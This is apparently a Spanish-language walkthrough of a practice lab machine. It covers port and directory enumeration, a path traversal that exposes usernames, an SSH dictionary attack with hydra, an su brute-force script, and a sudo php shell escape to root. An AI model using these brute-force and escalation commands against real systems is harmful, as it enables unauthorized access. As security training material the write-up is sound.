# Enumeracion de Puertos, Servicios y Versiones

```ruby
nmap -Pn -n -sS -p- --open -sCV --min-rate 3000 172.17.0.2 -oN nmap
```
```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-24 21:59 -03
Nmap scan report for 172.17.0.2
Host is up (0.0000020s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 03:cf:72:54:de:54:ae:cd:2a:16:58:6b:8a:f5:52:dc (ECDSA)
|_  256 13:bb:c2:12:f5:97:30:a1:49:c7:f9:d0:ba:d0:5e:f7 (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: Apache2 Debian Default Page: It works
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.12 seconds
```
2 servicios expuestos `ssh` y `http`, comienzo chequeando el servicio web

![image](https://github.com/user-attachments/assets/ddc24001-798b-433b-8557-0a64643b756c)

me consigo con la plantilla de apache, fuzzeo la web

```ruby
feroxbuster -u 'http://172.17.0.2' -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -s 200,301,302 -x txt,php,bak,db,py,html,js,jpg,png,git,sh -t 200 --random-agent --no-state -d 5
```
```bash
                                                                                                                                                                          
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://172.17.0.2
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 👌  Status Codes          │ [200, 301, 302]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ Random
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [txt, php, bak, db, py, html, js, jpg, png, git, sh]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 5
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        9l       28w      307c http://172.17.0.2/shop => http://172.17.0.2/shop/
200      GET      368l      933w    10701c http://172.17.0.2/index.html
200      GET       24l      127w    10359c http://172.17.0.2/icons/openlogo-75.png
200      GET      368l      933w    10701c http://172.17.0.2/
200      GET     1116l     6033w   478553c http://172.17.0.2/shop/keyboard.jpg
200      GET       44l       90w     1112c http://172.17.0.2/shop/index.php
```

chequeo `http://172.17.0.2/shop/index.php`

![image](https://github.com/user-attachments/assets/84b3faa7-7dc6-4de0-b1d3-3ef6981a596f)

observo un mensaje debajo lo cual parece ser un parametro en el `../index.php` asi que testeo

![image](https://github.com/user-attachments/assets/87f2987a-6f0d-418d-8eec-92595223238a)

obtengo los user del sistema `manchi` & `seller` ahora puedo intentar un ataque de diccionario contra el servicio `ssh`

```ruby
hydra -l manchi -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```
```bash
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-24 22:08:11
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344403 login tries (l:1/p:14344403), ~896526 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: manchi   password: lovely
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-24 22:08:18
```
obtengo credenciales asi que accedo al sistema

# Escalada de Privilegios

### manchi

no consigo nada con este user para escalar por lo que pasare un script desde mi maquina atacante mas el diccionario rockyou para hacer un ataque de diccionario contra el user `seller`

script para realizar el ataque de diccionario

```ruby
scp Linux-Su-Force.sh manchi@172.17.0.2:/home/manchi
```
diccionario `rockyou`

```ruby
scp rockyou.txt manchi@172.17.0.2:/home/manchi
```

ahora realizo el ataque contra el user `seller`

```ruby
bash Linux-Su-Force.sh seller rockyou.txt
```

![image](https://github.com/user-attachments/assets/1003b4bd-fe5d-446e-856c-af59680e2960)

obtengo las credenciales y cambio de user

### seller

```ruby
sudo -l
```

![image](https://github.com/user-attachments/assets/c231b6f3-4a10-4fb8-a8c4-03dda1d0b12d)

busco el binario con `searchbins` (en mi maquina atacante y sino tienen instalado searchbins pueden buscar en GTFOBINS)

```ruby
searchbins -b php -f sudo
```

```bash
[+] Binary: php

================================================================================
[*] Function: sudo -> [https://gtfobins.github.io/gtfobins/php/#sudo]

	| CMD="/bin/sh"
	| sudo php -r "system('$CMD');"
```

procedo a la escalada

```ruby
sudo php -r "system('/bin/bash');"
```

![image](https://github.com/user-attachments/assets/c5bf57cc-3c45-48a8-aa4e-2153b1507adb)

### `ROOT`






